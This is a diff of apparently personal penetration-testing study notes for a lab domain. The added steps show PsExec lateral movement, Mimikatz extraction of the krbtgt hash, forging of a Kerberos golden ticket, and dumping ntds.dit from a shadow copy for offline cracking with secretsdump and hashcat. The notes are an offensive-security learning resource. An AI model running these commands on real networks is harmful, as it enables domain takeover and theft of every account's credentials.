@@ -1107,7 +1107,40 @@ Login to DC
 
 # Lateral movement  
 - Login to DC
-- ddd
+
+**Out of scope**
+- Golden ticket
+  Pre-requisites: DC privileges, NTLM hash of krbtgt, Domain SID  
+  Note: PsExec connects via hostname  
+  1. From compromised CLIENT74 workstation (jen） attempt lateral movement
+     `psexec.exe \\DC1 cmd`
+  3. On DC1 (jeffadmin) extract krbtgt hash, domain SID  
+     ```
+     mimikatz.exe
+     privilege::debug
+     lsadump::lsa /inject
+     ```
+  5. Return to low-Privileged Workstation CLIENT74 (jen), open Mimikatz and purge existing kerberos ticket  
+     `kerberos::purge`
+  7. Forget golden ticket
+     `kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:NTLMHASH /id:500 /ptt`  
+  9. Spawn a New Elevated Shell in mimikatz
+      `misc::cmd`
+  11. Validate Access with Lateral Movemen
+      `psexec.exe \\DC1 cmd`  #jen has domain admin group memberships now  
+- Shadow Copies 
+  1. obtain domain admin (jeffadmin)
+  2. create shadow copy by note down the generated shadow copy device name
+     `vshadow.exe -nw -p C:`  
+     `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`  
+  4. Copy the NTDS Database from the Shadow Copy
+     `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit.bak`  
+  6. Dump the SYSTEM Hive from the Registry
+     `reg save HKLM\SYSTEM C:\system.bak`  
+  8. Move the ntds.dit.bak, system.bak to kali
+  9. Use Impacket’s secretsdump.py to parse the NTDS Database Offline
+     `secretsdump.py -ntds ntds.dit.bak -system system.bak LOCAL`
+  11. cracked offline by using hashcat or john
 
 # Port tunneling and port redirection
 - Tutotial
